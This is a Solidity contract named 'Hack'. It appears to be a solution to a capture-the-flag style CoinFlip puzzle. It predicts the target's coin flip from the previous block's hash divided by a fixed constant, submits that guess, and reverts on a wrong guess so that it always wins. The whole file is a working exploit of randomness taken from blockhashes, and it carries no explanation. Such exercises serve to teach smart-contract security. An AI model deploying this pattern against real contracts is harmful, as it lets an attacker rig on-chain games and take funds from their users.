// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface CoinFlip {
	function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns(uint256);
}

contract Hack {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function _getSide() private view returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
        
      

    function getFilip(address _targetExploit) external {
            require( CoinFlip(_targetExploit).flip(_getSide()) == true,"false");
    }

    function getConsecutiveWins (address _targetExploit) view external returns (uint256) {
          return  CoinFlip(_targetExploit).consecutiveWins();
    }

}